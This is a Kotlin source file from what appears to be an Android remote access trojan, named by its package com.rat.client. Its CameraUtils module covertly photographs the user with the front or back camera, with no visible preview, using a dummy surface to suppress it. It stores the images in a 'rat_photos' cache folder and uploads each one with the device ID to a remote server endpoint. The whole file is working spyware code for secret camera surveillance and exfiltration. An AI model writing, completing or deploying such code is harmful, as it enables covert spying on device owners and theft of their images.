package com.rat.client.utils

import android.Manifest
import android.content.Context
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.util.Size
import android.view.Surface
import com.rat.client.Config
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Captures photos from front and back cameras without preview.
 * Uses Camera2 API for silent capture with proper orientation handling.
 */
object CameraUtils {
    private const val TAG = "CameraUtils"
    private const val PHOTO_WIDTH = 1280
    private const val PHOTO_HEIGHT = 720

    /**
     * Capture a photo from the specified camera.
     * @param context Application context
     * @param useFront true for front camera, false for back camera
     */
    fun capturePhoto(context: Context, useFront: Boolean): File? {
        if (!PermissionManager.hasPermissions(context, arrayOf(Manifest.permission.CAMERA))) {
            Log.w(TAG, "Camera permission not granted")
            return null
        }

        return try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = getCameraId(cameraManager, useFront) ?: run {
                Log.e(TAG, "No ${if (useFront) "front" else "back"} camera found")
                return null
            }

            val latch = CountDownLatch(1)
            var capturedFile: File? = null

            // Dummy preview surface – required by some camera HALs to deliver JPEG
            val dummyTexture = SurfaceTexture(0)
            val previewSurface = Surface(dummyTexture)

            val handlerThread = HandlerThread("CameraCapture")
            handlerThread.start()
            val handler = Handler(handlerThread.looper)

            // Get camera characteristics for proper orientation
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
            val rotation = if (useFront) {
                (360 - sensorOrientation) % 360
            } else {
                sensorOrientation
            }

            // Determine best capture size
            val captureSizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                ?.getOutputSizes(android.graphics.ImageFormat.JPEG)
            val optimalSize = captureSizes?.let { findOptimalSize(it, PHOTO_WIDTH, PHOTO_HEIGHT) }
                ?: Size(PHOTO_WIDTH, PHOTO_HEIGHT)
            Log.d(TAG, "Using capture size: ${optimalSize.width}x${optimalSize.height}")

            // Create output file
            val outputDir = File(context.cacheDir, "rat_photos")
            outputDir.mkdirs()
            val outputFile = File(outputDir, "photo_${System.currentTimeMillis()}_${if (useFront) "front" else "back"}.jpg")

            val reader = ImageReader.newInstance(optimalSize.width, optimalSize.height, android.graphics.ImageFormat.JPEG, 2)

            // Save frames to file (overwrite = last write wins = final frame).
            // Release the latch once the first frame is processed to avoid duplicates.
            reader.setOnImageAvailableListener({ reader ->
                var saved = false
                val image = reader.acquireLatestImage()
                if (image != null) {
                    try {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        FileOutputStream(outputFile).use { it.write(bytes) }
                        capturedFile = outputFile
                        saved = true
                        Log.d(TAG, "Frame saved: ${bytes.size} bytes")
                        // Release on first frame so caller can upload after capture completes.
                        latch.countDown()
                    } catch (e: Exception) {
                        Log.e(TAG, "Frame error: ${e.message}")
                    } finally {
                        image.close()
                    }
                }
                if (!saved) {
                    // rare: listener fired but no image
                    latch.countDown()
                }
            }, handler)

            // Open camera and create capture session
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        // Include a dummy preview surface so front-camera HALs
                        // deliver JPEG frames reliably.
                        val surfaces = listOf(previewSurface, reader.surface)
                        camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    request.addTarget(reader.surface)

                                    // Set JPEG orientation based on sensor
                                    request.set(CaptureRequest.JPEG_ORIENTATION, rotation)

                                    session.capture(request.build(), object : CameraCaptureSession.CaptureCallback() {
                                        override fun onCaptureCompleted(
                                            session: CameraCaptureSession,
                                            request: CaptureRequest,
                                            result: TotalCaptureResult
                                        ) {
                                            super.onCaptureCompleted(session, request, result)
                                            Log.d(TAG, "Capture completed for ${if (useFront) "front" else "back"} camera")
                                            // If listener hasn't released the latch yet (race), fallback.
                                            handler.postDelayed({
                                                if (latch.count > 0) {
                                                    Log.w(TAG, "No frame from listener, trying direct grab")
                                                    val img = reader.acquireLatestImage()
                                                    if (img != null) {
                                                        try {
                                                            val buf = img.planes[0].buffer
                                                            val bytes = ByteArray(buf.remaining())
                                                            buf.get(bytes)
                                                            FileOutputStream(outputFile).use { it.write(bytes) }
                                                            capturedFile = outputFile
                                                        } finally { img.close() }
                                                    }
                                                    latch.countDown()
                                                }
                                            }, 1500)
                                        }

                                        override fun onCaptureFailed(
                                            session: CameraCaptureSession,
                                            request: CaptureRequest,
                                            failure: CaptureFailure
                                        ) {
                                            super.onCaptureFailed(session, request, failure)
                                            Log.e(TAG, "Capture failed: ${failure.reason} - ${failure.frameNumber}")
                                            latch.countDown()
                                        }
                                    }, handler)
                                } catch (e: Exception) {
                                    Log.e(TAG, "Capture request error: ${e.message}")
                                    latch.countDown()
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "Camera session configure failed")
                                latch.countDown()
                            }
                        }, handler)
                    } catch (e: Exception) {
                        Log.e(TAG, "Session creation error: ${e.message}")
                        latch.countDown()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "Camera disconnected")
                    latch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera error code: $error")
                    latch.countDown()
                }
            }, handler)

            val ok = latch.await(20, TimeUnit.SECONDS)
            handlerThread.quitSafely()
            previewSurface.release()
            dummyTexture.release()

            if (!ok) {
                Log.e(TAG, "Camera capture timed out")
            }

            if (capturedFile != null && capturedFile!!.exists() && capturedFile!!.length() > 0) {
                Log.d(TAG, "Uploading: ${capturedFile!!.absolutePath} (${capturedFile!!.length()} B)")
                uploadPhoto(context, capturedFile!!, useFront)
            } else {
                Log.e(TAG, "No photo file produced")
            }

            capturedFile
        } catch (e: Exception) {
            Log.e(TAG, "Capture photo error: ${e.message}")
            android.util.Log.getStackTraceString(e).let { Log.e(TAG, it) }
            null
        }
    }

    private fun findOptimalSize(sizes: Array<android.util.Size>, targetWidth: Int, targetHeight: Int): android.util.Size? {
        var optimal: android.util.Size? = null
        for (size in sizes) {
            if (size.width >= targetWidth && size.height >= targetHeight) {
                if (optimal == null || (size.width * size.height < optimal.width * optimal.height)) {
                    optimal = size
                }
            }
        }
        return optimal ?: sizes.firstOrNull()
    }

    private fun getCameraId(cameraManager: CameraManager, useFront: Boolean): String? {
        for (id in cameraManager.cameraIdList) {
            val characteristics = cameraManager.getCameraCharacteristics(id)
            val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
            if (useFront && facing == CameraCharacteristics.LENS_FACING_FRONT) return id
            if (!useFront && facing == CameraCharacteristics.LENS_FACING_BACK) return id
        }
        return null
    }

    private fun uploadPhoto(context: Context, file: File, isFront: Boolean) {
        try {
            val extraFields = mapOf(
                "deviceId" to DeviceInfoUtils.getDeviceId(context),
                "fileName" to file.name,
                "mimeType" to "image/jpeg",
                "isVideo" to "false",
            )
            val response = ApiClient.uploadFile(Config.Api.UPLOAD_MEDIA, file, extraFields)
            if (response != null) {
                Log.d(TAG, "Photo uploaded successfully: ${file.name}")
            } else {
                Log.e(TAG, "Photo upload failed - no response from server")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Upload error: ${e.message}")
        }
    }
}